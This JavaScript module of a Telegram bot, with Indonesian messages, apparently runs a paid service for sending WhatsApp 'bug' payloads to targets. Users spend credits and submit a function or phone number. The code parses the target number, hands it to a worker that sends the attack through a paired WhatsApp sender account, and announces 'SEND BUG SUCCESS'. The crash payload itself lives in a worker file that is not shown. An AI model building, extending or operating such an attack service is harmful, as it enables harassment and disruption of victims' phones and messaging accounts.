const router = require("./router");
const cfg = require("../config");
const fs = require("fs");
const path = require("path");
const { Worker } = require("worker_threads");
const notify = require("./notify");

const WORKER_PATH = path.join(__dirname, "wa-worker.js");

router.registerCallback("menu_tesfunc", async (bot, q, data, user, ctx) => {
    const senders = ctx.db.read("senders");
    const list = Object.keys(senders);

    if (list.length === 0) {
        return bot.sendMessage(q.message.chat.id,
            `<b>✕ Belum ada sender!</b>\n\nSilakan Add Sender dulu.`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𖡛 Add Sender", callback_data: "menu_addsender", style: "success" }]] } });
    }

    if (user.credit < 1) {
        return bot.sendMessage(q.message.chat.id,
            `<b>✕ Credit lu habis!</b>\n\nCredit minimal 1 untuk tes function.`,
            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "𖡛 Buy Credit", callback_data: "menu_buycredit", style: "primary" }]] } });
    }

    const caption =
        `<b>𖡛 TES FUNCTION BUG</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `𖡛 <b>Senders tersedia</b>: <code>${list.length}</code>\n` +
        `𖡛 <b>Credit lu</b>: <code>${user.credit}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `<i>Kirim file .txt berisi kode function ATAU ketik langsung function nya di chat.</i>`;

    ctx.setState(user.id, "tesfunc_await", {});

    await bot.sendMessage(q.message.chat.id, caption, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "✕ Batal", callback_data: "menu_back", style: "danger" }]] }
    });
});

router.registerMessage("tesfunc_await", async (bot, msg, state, ctx) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    let content = "";

    if (msg.document) {
        try {
            const fileLink = await bot.getFileLink(msg.document.file_id);
            const axios = require("axios");
            const res = await axios.get(fileLink, { responseType: "text", timeout: 15000 });
            content = res.data;
        } catch (e) {
            ctx.clearState(userId);
            return bot.sendMessage(chatId, `✖️ Gagal baca file: <code>${e.message}</code>`, { parse_mode: "HTML" });
        }
    } else if (msg.text && msg.text.toLowerCase() !== "batal") {
        content = msg.text;
    } else {
        return;
    }

    const match = content.match(/ExoidFc\s*\(\s*sock\s*,\s*['"]?([0-9+]+)['"]?\s*\)/i) ||
                  content.match(/([0-9]{10,15})/);

    if (!match) {
        ctx.clearState(userId);
        return bot.sendMessage(chatId, `<b>✕ Nomor target tidak ditemukan di function!</b>`, { parse_mode: "HTML" });
    }

    let target = match[1].replace(/[^0-9]/g, "");
    if (target.startsWith("0")) target = "62" + target.slice(1);
    if (!target.startsWith("62")) target = "62" + target;

    const user = ctx.db.getUser(userId);
    if (user.credit < 1) {
        ctx.clearState(userId);
        return bot.sendMessage(chatId, "✕ Credit lu habis!", { parse_mode: "HTML" });
    }

    ctx.db.saveUser(userId, { credit: user.credit - 1 });
    ctx.clearState(userId);

    const senders = ctx.db.read("senders");
    const senderKey = Object.keys(senders)[0];

    const loading = await bot.sendMessage(chatId,
        `<b>𖡛 Loading... 0%</b>\n\n𖡛 Target: <code>${target}</code>\n𖡛 Sender: <code>${senderKey}</code>`,
        { parse_mode: "HTML" });

    let progress = 0;
    const progressTimer = setInterval(async () => {
        progress += 10;
        if (progress > 100) progress = 100;
        try {
            await bot.editMessageText(
                `<b>𖡛 Loading... ${progress}%</b>\n\n𖡛 Target: <code>${target}</code>\n𖡛 Sender: <code>${senderKey}</code>`,
                { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" });
        } catch {}
        if (progress >= 100) clearInterval(progressTimer);
    }, 300);

    const result = await new Promise((resolve) => {
        const worker = new Worker(WORKER_PATH, {
            workerData: { senderNumber: senderKey, target, pairingDir: path.join(__dirname, "..", "pairing") }
        });
        const timer = setTimeout(() => {
            try { worker.terminate(); } catch {}
            resolve({ ok: false, error: "timeout 30 detik" });
        }, 30000);
        worker.on("message", (msg) => {
            clearTimeout(timer);
            try { worker.terminate(); } catch {}
            resolve(msg);
        });
        worker.on("error", (err) => {
            clearTimeout(timer);
            try { worker.terminate(); } catch {}
            resolve({ ok: false, error: err.message });
        });
    });

    clearInterval(progressTimer);
    try { await bot.deleteMessage(chatId, loading.message_id); } catch {}

    const userAfter = ctx.db.getUser(userId);
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    if (result.ok) {
        try {
            await bot.sendPhoto(chatId, cfg.FOTO.TESFUNC, {
                caption:
                    `<b>✓ SEND BUG SUCCESS</b>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `𖡛 <b>Target</b>: <code>+${target}</code>\n` +
                    `𖡛 <b>Sender</b>: <code>${senderKey}</code>\n` +
                    `𖡛 <b>Sisa Credit</b>: <code>${userAfter.credit}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "𖡛 Cek Nomor WhatsApp", url: `https://wa.me/${target}`, style: "primary" }],
                        [{ text: "✕ Kembali", callback_data: "menu_back", style: "danger" }]
                    ]
                }
            });
        } catch {
            await bot.sendMessage(chatId,
                `<b>✓ SEND BUG SUCCESS</b>\n\n𖡛 +${target}\n𖡛 ${senderKey}`,
                { parse_mode: "HTML" });
        }

        await notify.notifySuccess(bot, "TESFUNC SUCCESS", [
            { label: "𖡛 Target", value: "+" + target },
            { label: "𖡛 Sender", value: senderKey },
            { label: "𖡛 User", value: msg.from.first_name || "User" },
            { label: "𖡛 User ID", value: String(userId) },
            { label: "𖡛 Sisa Credit", value: String(userAfter.credit) },
            { label: "𖡛 Waktu", value: waktu }
        ], `<b>✓ TESFUNC SUCCESS</b>\n\nTarget: <code>+${target}</code>\nUser: ${msg.from.first_name}\nSisa Credit: <code>${userAfter.credit}</code>`);
    } else {
        await bot.sendMessage(chatId,
            `<b>✕ SEND BUG TO TARGET FAILED</b>\n\n<code>${result.error || "unknown error"}</code>`,
            { parse_mode: "HTML" });

        await notify.notifyFailed(bot, "TESFUNC FAILED", [
            { label: "𖡛 Target", value: "+" + target },
            { label: "𖡛 Sender", value: senderKey },
            { label: "𖡛 User", value: msg.from.first_name || "User" },
            { label: "𖡛 User ID", value: String(userId) },
            { label: "✕ Error", value: (result.error || "unknown").slice(0, 40) },
            { label: "𖡛 Waktu", value: waktu }
        ], `<b>✕ TESFUNC FAILED</b>\n\nTarget: <code>+${target}</code>\nError: <code>${result.error}</code>`);
    }
});